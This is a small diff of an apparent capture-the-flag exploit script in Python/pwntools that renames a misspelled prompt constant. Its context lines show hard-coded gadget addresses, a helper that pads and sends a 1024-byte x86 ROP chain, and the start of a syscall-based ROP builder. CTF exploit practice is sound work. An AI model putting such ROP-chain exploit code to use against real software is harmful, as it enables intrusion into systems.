@@ -108,10 +108,10 @@ SYSCALL = BASE + 0x22cd
 BREAKLINE = 0x133746F0
 BUFF = 0x13375d60
 ENTRYNAME = 0x13375d6a
-CHAIN_PROMT = b'Give me your x86 32bit ROP chain (exactly 1024 bytes):\n'
+CHAIN_PROMPT = b'Give me your x86 32bit ROP chain (exactly 1024 bytes):\n'
 MAX_CHILDREN = 12
 
-sendpayload = lambda io, payload: io.sa(CHAIN_PROMT, payload.ljust(1024, b'\x00')) if len(payload) <= 1024 else log.error("Payload too long")
+sendpayload = lambda io, payload: io.sa(CHAIN_PROMPT, payload.ljust(1024, b'\x00')) if len(payload) <= 1024 else log.error("Payload too long")
 
 def sys_exit(io, status):
     rop = ROP(exe)
